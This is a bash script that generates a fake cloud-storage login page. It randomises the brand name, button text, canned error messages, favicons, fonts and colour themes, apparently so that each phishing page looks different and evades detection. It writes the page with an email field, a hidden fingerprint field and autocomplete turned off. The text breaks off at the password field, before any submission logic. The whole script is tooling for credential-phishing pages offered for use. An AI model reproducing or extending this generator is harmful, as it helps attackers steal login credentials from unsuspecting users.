#!/bin/bash

TARGET_DIR=$1

if [ -z "$TARGET_DIR" ]; then
    echo "Err: Target directory required."
    exit 1
fi

HEADERS=("Welcome to FileShare" "Login to Your CloudBox" "Enter Your Secure Vault" "Access Your DataVault" "Sign in to EasyFiles" "Connect to QuickAccess" "Welcome to VaultZone" "Login to SkyDrive" "Enter Your SafeData" "Sign in to FlexShare" "Access Your DropZone" "Welcome to SecureStorage" "Login to FastFiles" "Enter Your SharePoint" "Welcome to MegaVault" "Sign in to Boxify" "Access Your DataBank" "Welcome to DriveSecure" "Login to FileStream" "Connect to AccessHub")
BUTTON_TEXTS=("Sign In" "Log In" "Login" "Access Account" "Enter Account" "Sign In to Continue" "Sign In to Dashboard" "Log In to Your Account" "Continue to Account" "Access Your Dashboard" "Let’s Go" "Welcome Back!" "Get Started" "Join Us Again" "Back Again? Sign In" "Secure Sign In" "Protected Login" "Sign In Securely" "Enter" "Go")

ERROR_MESSAGES=(
    "Invalid username or password."
    "Connection timeout. Please try again."
    "Access denied by security policy."
    "Account is temporarily locked."
    "Network error: Handshake failed."
    "Invalid authentication token."
    "Session expired. Please refresh."
    "Error 502: Bad Gateway."
    "LDAP Server not responding."
)

FAVICONS=(
    # 1. Cloud (Blue) - Классическое облако
    "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMjU2M0VCIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTE3LjUgMTlhMy41IDMuNSAwIDAgMCAwLTdoLTVhNC41IDQuNSAwIDAgMC04LjggMi4xQSA0IDQgMCAwIDAgNiAyMWgxMS41eiIvPjwvc3ZnPg=="
    
    # 2. Lock (Green) - Замок (безопасность)
    "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMDU5NjY5IiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHJlY3QgeD0iMyIgeT0iMTEiIHdpZHRoPSIxOCIgaGVpZ2h0PSIxMSIgcng9IjIiIHJ5PSIyIi8+PHBhdGggZD0iTTcgMTEVdi00YTUgNSAwIDAgMSAxMCAwdjQiLz48L3N2Zz4="
    
    # 3. Shield (Red/Orange) - Щит (защищенная зона)
    "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjREM1RjAwIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTEyIDIybDguMTMtOC44NWMuNDgtLjUyLjU2LTEuMzMuMi0xLjkxbC01LjI0LTguNDZhMiAyIDAgMCAwLTEuNzItLjkzSDguNjNhMiAyIDAgMCAwLTEuNzIuOTNMMS42NyAxMS4yNWMtLjM2LjU4LS4yOCAxLjM5LjIgMS45MUwxMiAyMnoiLz48L3N2Zz4="

    # 4. Folder (Yellow/Amber) - Папка (файловый менеджер)
    "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjRjU5RTBCIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTIyIDE5YTIgMiAwIDAgMS0yIDJINGEyIDIgMCAwIDEtMi0yVjVhMiAyIDAgMCAxIDItMmg1bDIgM2g5YTIgMiAwIDAgMSAyIDJ6Ii8+PC9zdmc+"

    # 5. Server (Slate) - Серверная стойка (IT инфраструктура)
    "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjNDc1NTY5IiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHJlY3QgeD0iMiIgeT0iMiIgd2lkdGg9IjIwIiBoZWlnaHQ9IjgiIHJ4PSIyIiByeT0iMiIvPjxyZWN0IHg9IjIiIHk9IjE0IiB3aWR0aD0iMjAiIGhlaWdodD0iOCIgcng9IjIiIHJ5PSIyIi8+PGxpbmUgeDE9IjYiIHkxPSI2IiB4Mj0iNi4wMSIgeTI9IjYiLz48bGluZSB4MT0iNiIgeTE9IjE4IiB4Mj0iNi4wMSIgeTI9IjE4Ii8+PC9zdmc+"

    # 6. Cube (Purple) - Куб (продукты, контейнеры, Box)
    "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjN0MZM0Y3IiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTIxIDE2VjhhMiAyIDAgMCAwLTEtMS43M2wtNy00YTIgMiAwIDAgMC0yIDBsLTcgNEEyIDIgMCAwIDAgMyA4djhhMiAyIDAgMCAwIDEgMS43M2w3IDRhMiAyIDAgMCAwIDIgMGw3LTRBMiAyIDAgMCAwIDIxIDE2eiIvPjxwb2x5bGluZSBwb2ludHM9IjMuMjcgNi45NiAxMiAxMi4wMSAyMC43MyA2Ljk2Ii8+PGxpbmUgeDE9IjEyIiB5MT0iMjIuMDgiIHgyPSIxMiIgeTI9IjEyIi8+PC9zdmc+"

    # 7. User Circle (Indigo) - Аккаунт пользователя
    "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjNDMzOENBIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTIwIDIxdi0yYTQgNCAwIDAgMC00LTRIODRhNCA0IDAgMCAwLTQgNHYyIi8+PGNpcmNsZSBjeD0iMTIiIGN5PSI3IiByPSI0Ii8+PC9zdmc+"

    # 8. Key (Teal) - Ключ доступа
    "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMEY3NjZFIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTIxIDJsLTIgMm0tNy42MSA3LjYxYTUuNSA1LjUgMCAxIDEtNy43NzggNy43NzggNS41IDUuNSAwIDAgMSA3Ljc3Ny03Ljc3N3ptMCAwTDE1LjUgNy41bTAgMGwzIDNMMjIgN2wtMy0zbS0zLjUgMy41TDE5IDQiLz48L3N2Zz4="

    # 9. Globe (Cyan) - Сеть / Интернет
    "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMDg5MUIyIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiLz48bGluZSB4MT0iMiIgeTE9IjEyIiB4Mj0iMjIiIHkyPSIxMiIvPjxwYXRoIGQ9Ik0xMiAybTUuNSA1LjVhMTUuMTUgMTUuMTUgMCAwIDEgMCA5bS0xMSAwYTE1LjE1IDE1LjE1IDAgMCAxIDAtOSIvPjwvc3ZnPg=="

    # 10. File Text (Gray) - Документ
    "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjNEI1NTYzIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTE0IDJINmEyIDIgMCAwIDAtMiAydjE2YTIgMiAwIDAgMCAyIDJ4MTJhMiAyIDAgMCAwIDItMlY4eiIvPjxwb2x5bGluZSBwb2ludHM9IjE0IDIgMTQgOCAyMCA4Ii8+PGxpbmUgeDE9IjE2IiB5MT0iMTMiIHgyPSI4IiB5Mj0iMTMiLz48bGluZSB4MT0iMTYiIHkxPSIxNyIgeDI9IjgiIHkyPSIxNyIvPjxsaW5lIHgxPSIxMCIgeTE9IjkiIHgyPSI4IiB5Mj0iOSIvPjwvc3ZnPg=="
)

FONTS_DATA=(
    "Inter|Inter:wght@400;600;700"
    "Poppins|Poppins:wght@400;600;700"
    "Roboto|Roboto:wght@400;500;700"
    "Lato|Lato:wght@400;700"
    "Montserrat|Montserrat:wght@400;600;700"
    "Open Sans|Open+Sans:wght@400;600;700"
    "Raleway|Raleway:wght@400;600;700"
)

ROUNDNESS_OPTS=("rounded-lg" "rounded-xl" "rounded-2xl")
BUTTON_COLORS=("bg-blue-600 hover:bg-blue-700" "bg-green-600 hover:bg-green-700" "bg-red-600 hover:bg-red-700" "bg-purple-600 hover:bg-purple-700" "bg-indigo-600 hover:bg-indigo-700" "bg-teal-600 hover:bg-teal-700" "bg-orange-600 hover:bg-orange-700" "bg-pink-600 hover:bg-pink-700" "bg-cyan-600 hover:bg-cyan-700" "bg-emerald-600 hover:bg-emerald-700" "bg-rose-600 hover:bg-rose-700" "bg-slate-800 hover:bg-slate-900" "bg-violet-600 hover:bg-violet-700" "bg-gradient-to-r from-blue-500 to-cyan-500 hover:opacity-90" "bg-gradient-to-r from-purple-500 to-pink-500 hover:opacity-90" "bg-gradient-to-r from-orange-400 to-red-500 hover:opacity-90")

BG_GRADIENTS=(
    "bg-gradient-to-br from-blue-50 via-white to-blue-50"
    "bg-gradient-to-tr from-gray-100 to-gray-200"
    "bg-gradient-to-br from-slate-900 via-gray-900 to-black"
    "bg-gradient-to-r from-blue-900 to-slate-900"
    "bg-gradient-to-br from-blue-100 via-blue-300 to-blue-500"
    "bg-gradient-to-tr from-purple-200 via-purple-400 to-purple-800"
    "bg-gradient-to-bl from-teal-200 to-lime-200"
    "bg-gradient-to-r from-rose-100 to-teal-100"
    "bg-gradient-to-tl from-gray-700 via-gray-900 to-black"
    "bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900"
    "bg-gradient-to-tr from-indigo-500 via-purple-500 to-pink-500"
    "bg-gradient-to-b from-gray-900 to-gray-600 bg-gradient-to-r"
    "bg-gradient-to-bl from-indigo-900 via-slate-800 to-indigo-900"
)

HEADER=${HEADERS[$RANDOM % ${#HEADERS[@]}]}
BUTTON_TEXT=${BUTTON_TEXTS[$RANDOM % ${#BUTTON_TEXTS[@]}]}
ERROR_TEXT=${ERROR_MESSAGES[$RANDOM % ${#ERROR_MESSAGES[@]}]}
BUTTON_COLOR=${BUTTON_COLORS[$RANDOM % ${#BUTTON_COLORS[@]}]}
BG_STYLE=${BG_GRADIENTS[$RANDOM % ${#BG_GRADIENTS[@]}]}
ROUNDING=${ROUNDNESS_OPTS[$RANDOM % ${#ROUNDNESS_OPTS[@]}]}
FAVICON=${FAVICONS[$RANDOM % ${#FAVICONS[@]}]}

FONT_PAIR=${FONTS_DATA[$RANDOM % ${#FONTS_DATA[@]}]}
FONT_NAME=$(echo $FONT_PAIR | cut -d'|' -f1)
FONT_URL_PART=$(echo $FONT_PAIR | cut -d'|' -f2)

RANDOM_TOKEN=$(openssl rand -hex 16)

if [[ "$BG_STYLE" == *"slate-900"* || "$BG_STYLE" == *"black"* ]]; then
    THEME_MODE=1
else
    THEME_MODE=0
fi

if [ $THEME_MODE -eq 1 ]; then
    TEXT_MAIN="text-white"
    TEXT_MUTED="text-gray-400"
    TEXT_INPUT="text-white"
    CARD_BG="bg-gray-900/50 backdrop-blur-xl border border-gray-700/50 shadow-2xl"
    INPUT_BG="bg-gray-800/50 border-gray-600 focus:border-blue-500 placeholder-gray-500"
    ERROR_BOX="bg-red-900/20 border-red-800 text-red-300"
else
    TEXT_MAIN="text-gray-900"
    TEXT_MUTED="text-gray-500"
    TEXT_INPUT="text-gray-900"
    CARD_BG="bg-white/90 backdrop-blur-xl border border-gray-100 shadow-xl"
    INPUT_BG="bg-white border-gray-300 focus:border-blue-600 focus:ring-4 focus:ring-blue-600/10 placeholder-gray-400"
    ERROR_BOX="bg-red-50 border-red-100 text-red-600"
fi

cat > "$TARGET_DIR/index.html" <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
    <title>$HEADER</title>
    <link rel="icon" type="image/svg+xml" href="$FAVICON">
    <style>
        :root {
            /* Colors used in arrays */
            --blue-50: #eff6ff; --blue-100: #dbeafe; --blue-300: #93c5fd; --blue-500: #3b82f6; --blue-600: #2563eb; --blue-700: #1d4ed8; --blue-900: #1e3a8a;
            --green-600: #16a34a; --green-700: #15803d;
            --red-50: #fef2f2; --red-100: #fee2e2; --red-300: #fca5a5; --red-500: #ef4444; --red-600: #dc2626; --red-700: #b91c1c; --red-800: #991b1b; --red-900: #7f1d1d;
            --purple-200: #e9d5ff; --purple-400: #c084fc; --purple-500: #a855f7; --purple-600: #9333ea; --purple-700: #7e22ce; --purple-800: #6b21a8; --purple-900: #581c87;
            --indigo-500: #6366f1; --indigo-600: #4f46e5; --indigo-700: #4338ca; --indigo-900: #312e81;
            --teal-100: #ccfbf1; --teal-200: #99f6e4; --teal-600: #0d9488; --teal-700: #0f766e;
            --orange-400: #fb923c; --orange-600: #ea580c; --orange-700: #c2410c;
            --pink-500: #ec4899; --pink-600: #db2777; --pink-700: #be185d;
            --cyan-500: #06b6d4; --cyan-600: #0891b2; --cyan-700: #0e7490;
            --emerald-600: #059669; --emerald-700: #047857;
            --rose-100: #ffe4e6; --rose-600: #e11d48; --rose-700: #be123c;
            --slate-800: #1e293b; --slate-900: #0f172a;
            --violet-600: #7c3aed; --violet-700: #6d28d9;
            --lime-200: #d9f99d;
            --gray-100: #f3f4f6; --gray-200: #e5e7eb; --gray-300: #d1d5db; --gray-400: #9ca3af; --gray-500: #6b7280; --gray-600: #4b5563; --gray-700: #374151; --gray-800: #1f2937; --gray-900: #111827;
            --white: #ffffff;
            --black: #000000;
        }

        *, ::before, ::after { box-sizing: border-box; border-width: 0; border-style: solid; border-color: var(--gray-200); margin: 0; padding: 0; }
        
        body { 
            font-family: '$FONT_NAME', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased; 
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* Layout Utilities */
        .flex { display: flex; }
        .items-center { align-items: center; }
        .justify-center { justify-content: center; }
        .items-start { align-items: flex-start; }
        .w-full { width: 100%; }
        .max-w-\[400px\] { max-width: 400px; }
        .mx-4 { margin-left: 1rem; margin-right: 1rem; }
        .mx-auto { margin-left: auto; margin-right: auto; }
        .mb-4 { margin-bottom: 1rem; }
        .mb-8 { margin-bottom: 2rem; }
        .mt-0\.5 { margin-top: 0.125rem; }
        .ml-2 { margin-left: 0.5rem; }
        .p-3 { padding: 0.75rem; }
        .p-8 { padding: 2rem; }
        .px-4 { padding-left: 1rem; padding-right: 1rem; }
        .py-2\.5 { padding-top: 0.625rem; padding-bottom: 0.625rem; }
        .space-y-6 > :not([hidden]) ~ :not([hidden]) { margin-top: 1.5rem; }
        .space-y-2 > :not([hidden]) ~ :not([hidden]) { margin-top: 0.5rem; }
        .space-y-1\.5 > :not([hidden]) ~ :not([hidden]) { margin-top: 0.375rem; }
        .space-y-5 > :not([hidden]) ~ :not([hidden]) { margin-top: 1.25rem; }
        .gap-3 { gap: 0.75rem; }
        .gap-2 { gap: 0.5rem; }
        .h-12 { height: 3rem; }
        .w-12 { width: 3rem; }
        .h-6 { height: 1.5rem; }
        .w-6 { width: 1.5rem; }
        .w-5 { width: 1.25rem; }
        .h-5 { height: 1.25rem; }
        .block { display: block; }
        .hidden { display: none; }
        .flex-shrink-0 { flex-shrink: 0; }
        .relative { position: relative; }

        /* Typography */
        .text-center { text-align: center; }
        .text-2xl { font-size: 1.5rem; line-height: 2rem; }
        .text-sm { font-size: 0.875rem; line-height: 1.25rem; }
        .text-xs { font-size: 0.75rem; line-height: 1rem; }
        .font-bold { font-weight: 700; }
        .font-semibold { font-weight: 600; }
        .font-medium { font-weight: 500; }
        .tracking-tight { letter-spacing: -0.025em; }
        .tracking-wider { letter-spacing: 0.05em; }
        .uppercase { text-transform: uppercase; }

        /* Text Colors */
        .text-white { color: var(--white); }
        .text-gray-900 { color: var(--gray-900); }
        .text-gray-500 { color: var(--gray-500); }
        .text-gray-400 { color: var(--gray-400); }
        .text-red-600 { color: var(--red-600); }
        .text-red-300 { color: var(--red-300); }

        /* Borders & Rounding */
        .border { border-width: 1px; }
        .border-gray-100 { border-color: var(--gray-100); }
        .border-gray-300 { border-color: var(--gray-300); }
        .border-gray-600 { border-color: var(--gray-600); }
        .border-gray-700\/50 { border-color: rgba(55, 65, 81, 0.5); }
        .border-red-100 { border-color: var(--red-100); }
        .border-red-800 { border-color: var(--red-800); }
        .rounded-md { border-radius: 0.375rem; }
        .rounded-xl { border-radius: 0.75rem; }
        .rounded-lg { border-radius: 0.5rem; }
        .rounded-2xl { border-radius: 1rem; }
        
        /* Effects */
        .shadow-lg { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
        .shadow-xl { box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); }
        .shadow-2xl { box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); }
        .shadow-md { box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); }
        .backdrop-blur-xl { backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); }
        .transition-all { transition-property: all; transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1); transition-duration: 150ms; }
        .active\:scale-\[0\.98\]:active { transform: scale(0.98); }
        .outline-none { outline: 2px solid transparent; outline-offset: 2px; }

        /* Form Elements */
        .focus\:ring-2:focus { box-shadow: 0 0 0 2px var(--blue-600); }
        .focus\:ring-4:focus { box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); }
        .focus\:border-blue-500:focus { border-color: var(--blue-500); }
        .focus\:border-blue-600:focus { border-color: var(--blue-600); }
        .placeholder-gray-500::placeholder { color: var(--gray-500); }
        .placeholder-gray-400::placeholder { color: var(--gray-400); }
        
        /* Specific Backgrounds (Variables Mapped) */
        .bg-white { background-color: var(--white); }
        .bg-white\/90 { background-color: rgba(255, 255, 255, 0.9); }
        .bg-gray-800\/50 { background-color: rgba(31, 41, 55, 0.5); }
        .bg-gray-900\/50 { background-color: rgba(17, 24, 39, 0.5); }
        .bg-red-50 { background-color: var(--red-50); }
        .bg-red-900\/20 { background-color: rgba(127, 29, 29, 0.2); }

        /* Button Colors */
        .bg-blue-600 { background-color: var(--blue-600); } .hover\:bg-blue-700:hover { background-color: var(--blue-700); }
        .bg-green-600 { background-color: var(--green-600); } .hover\:bg-green-700:hover { background-color: var(--green-700); }
        .bg-red-600 { background-color: var(--red-600); } .hover\:bg-red-700:hover { background-color: var(--red-700); }
        .bg-purple-600 { background-color: var(--purple-600); } .hover\:bg-purple-700:hover { background-color: var(--purple-700); }
        .bg-indigo-600 { background-color: var(--indigo-600); } .hover\:bg-indigo-700:hover { background-color: var(--indigo-700); }
        .bg-teal-600 { background-color: var(--teal-600); } .hover\:bg-teal-700:hover { background-color: var(--teal-700); }
        .bg-orange-600 { background-color: var(--orange-600); } .hover\:bg-orange-700:hover { background-color: var(--orange-700); }
        .bg-pink-600 { background-color: var(--pink-600); } .hover\:bg-pink-700:hover { background-color: var(--pink-700); }
        .bg-cyan-600 { background-color: var(--cyan-600); } .hover\:bg-cyan-700:hover { background-color: var(--cyan-700); }
        .bg-emerald-600 { background-color: var(--emerald-600); } .hover\:bg-emerald-700:hover { background-color: var(--emerald-700); }
        .bg-rose-600 { background-color: var(--rose-600); } .hover\:bg-rose-700:hover { background-color: var(--rose-700); }
        .bg-slate-800 { background-color: var(--slate-800); } .hover\:bg-slate-900:hover { background-color: var(--slate-900); }
        .bg-violet-600 { background-color: var(--violet-600); } .hover\:bg-violet-700:hover { background-color: var(--violet-700); }
        .hover\:opacity-90:hover { opacity: 0.9; }

        /* Gradients System */
        .bg-gradient-to-br { background-image: linear-gradient(to bottom right, var(--tw-gradient-stops)); }
        .bg-gradient-to-tr { background-image: linear-gradient(to top right, var(--tw-gradient-stops)); }
        .bg-gradient-to-r { background-image: linear-gradient(to right, var(--tw-gradient-stops)); }
        .bg-gradient-to-bl { background-image: linear-gradient(to bottom left, var(--tw-gradient-stops)); }
        .bg-gradient-to-tl { background-image: linear-gradient(to top left, var(--tw-gradient-stops)); }
        .bg-gradient-to-b { background-image: linear-gradient(to bottom, var(--tw-gradient-stops)); }

        /* Gradient Stops */
        .from-blue-500 { --tw-gradient-from: var(--blue-500); --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(59, 130, 246, 0)); }
        .from-blue-50 { --tw-gradient-from: var(--blue-50); --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(239, 246, 255, 0)); }
        .from-blue-900 { --tw-gradient-from: var(--blue-900); --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(30, 58, 138, 0)); }
        .from-blue-100 { --tw-gradient-from: var(--blue-100); --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(219, 234, 254, 0)); }
        .from-purple-200 { --tw-gradient-from: var(--purple-200); --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(233, 213, 255, 0)); }
        .from-purple-500 { --tw-gradient-from: var(--purple-500); --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(168, 85, 247, 0)); }
        .from-teal-200 { --tw-gradient-from: var(--teal-200); --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(153, 246, 228, 0)); }
        .from-rose-100 { --tw-gradient-from: var(--rose-100); --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(255, 228, 230, 0)); }
        .from-gray-100 { --tw-gradient-from: var(--gray-100); --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(243, 244, 246, 0)); }
        .from-gray-700 { --tw-gradient-from: var(--gray-700); --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(55, 65, 81, 0)); }
        .from-gray-900 { --tw-gradient-from: var(--gray-900); --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(17, 24, 39, 0)); }
        .from-slate-900 { --tw-gradient-from: var(--slate-900); --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(15, 23, 42, 0)); }
        .from-indigo-500 { --tw-gradient-from: var(--indigo-500); --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(99, 102, 241, 0)); }
        .from-indigo-900 { --tw-gradient-from: var(--indigo-900); --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(49, 46, 129, 0)); }
        .from-orange-400 { --tw-gradient-from: var(--orange-400); --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(251, 146, 60, 0)); }

        .via-white { --tw-gradient-to: rgba(255, 255, 255, 0); --tw-gradient-stops: var(--tw-gradient-from), var(--white), var(--tw-gradient-to); }
        .via-gray-900 { --tw-gradient-to: rgba(17, 24, 39, 0); --tw-gradient-stops: var(--tw-gradient-from), var(--gray-900), var(--tw-gradient-to); }
        .via-blue-300 { --tw-gradient-to: rgba(147, 197, 253, 0); --tw-gradient-stops: var(--tw-gradient-from), var(--blue-300), var(--tw-gradient-to); }
        .via-purple-400 { --tw-gradient-to: rgba(192, 132, 252, 0); --tw-gradient-stops: var(--tw-gradient-from), var(--purple-400), var(--tw-gradient-to); }
        .via-purple-500 { --tw-gradient-to: rgba(168, 85, 247, 0); --tw-gradient-stops: var(--tw-gradient-from), var(--purple-500), var(--tw-gradient-to); }
        .via-slate-800 { --tw-gradient-to: rgba(30, 41, 59, 0); --tw-gradient-stops: var(--tw-gradient-from), var(--slate-800), var(--tw-gradient-to); }
        .via-purple-900 { --tw-gradient-to: rgba(88, 28, 135, 0); --tw-gradient-stops: var(--tw-gradient-from), var(--purple-900), var(--tw-gradient-to); }

        .to-blue-50 { --tw-gradient-to: var(--blue-50); }
        .to-blue-500 { --tw-gradient-to: var(--blue-500); }
        .to-purple-600 { --tw-gradient-to: var(--purple-600); }
        .to-purple-800 { --tw-gradient-to: var(--purple-800); }
        .to-gray-200 { --tw-gradient-to: var(--gray-200); }
        .to-gray-600 { --tw-gradient-to: var(--gray-600); }
        .to-slate-900 { --tw-gradient-to: var(--slate-900); }
        .to-black { --tw-gradient-to: var(--black); }
        .to-lime-200 { --tw-gradient-to: var(--lime-200); }
        .to-teal-100 { --tw-gradient-to: var(--teal-100); }
        .to-pink-500 { --tw-gradient-to: var(--pink-500); }
        .to-cyan-500 { --tw-gradient-to: var(--cyan-500); }
        .to-red-500 { --tw-gradient-to: var(--red-500); }
        .to-indigo-900 { --tw-gradient-to: var(--indigo-900); }

        @media (min-width: 640px) {
            .sm\:p-10 { padding: 2.5rem; }
        }

        /* Animations */
        .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
        @keyframes shake { 10%, 90% { transform: translate3d(-1px, 0, 0); } 20%, 80% { transform: translate3d(2px, 0, 0); } 30%, 50%, 70% { transform: translate3d(-4px, 0, 0); } 40%, 60% { transform: translate3d(4px, 0, 0); } }
        .loader { border: 2px solid transparent; border-radius: 50%; border-top: 2px solid currentColor; width: 1.25rem; height: 1.25rem; -webkit-animation: spin 1s linear infinite; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .fade-enter { opacity: 0; transform: translateY(-5px); }
        .fade-enter-active { opacity: 1; transform: translateY(0); transition: opacity 300ms, transform 300ms; }
        .cursor-wait { cursor: wait; }
        .opacity-80 { opacity: 0.8; }
    </style>
</head>
<body class="$BG_STYLE">
    
    <div id="auth-container" class="w-full max-w-[400px] mx-4 p-8 sm:p-10 space-y-6 $CARD_BG $ROUNDING transition-all">
        <div class="text-center space-y-2 mb-8">
            <div class="h-12 w-12 mx-auto mb-4 bg-gradient-to-br from-blue-500 to-purple-600 rounded-xl flex items-center justify-center shadow-lg text-white">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
            </div>
            <h2 class="text-2xl font-bold tracking-tight $TEXT_MAIN">$HEADER</h2>
        </div>

        <div id="sys-msg" class="hidden p-3 text-sm rounded-md border flex items-start gap-3 $ERROR_BOX" role="alert">
            <svg class="w-5 h-5 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
            <span class="font-medium" id="msg-content"></span>
        </div>

        <form id="vform" class="space-y-5" autocomplete="off">
            <input type="hidden" name="csrf_token" value="$RANDOM_TOKEN" />
            <input type="hidden" name="fingerprint" id="fp" value="" />
            
            <div class="space-y-1.5">
                <label class="block text-xs font-semibold uppercase tracking-wider $TEXT_MUTED"> Email</label>
                <input type="email" id="uid" required class="w-full px-4 py-2.5 text-sm transition-all rounded-md outline-none focus:ring-2 $INPUT_BG $TEXT_INPUT" placeholder="user@domain.com" />
            </div>
            
            <div class="space-y-1.5">
                <label class="block text-xs font-semibold uppercase tracking-wider $TEXT_MUTED">Password</label>
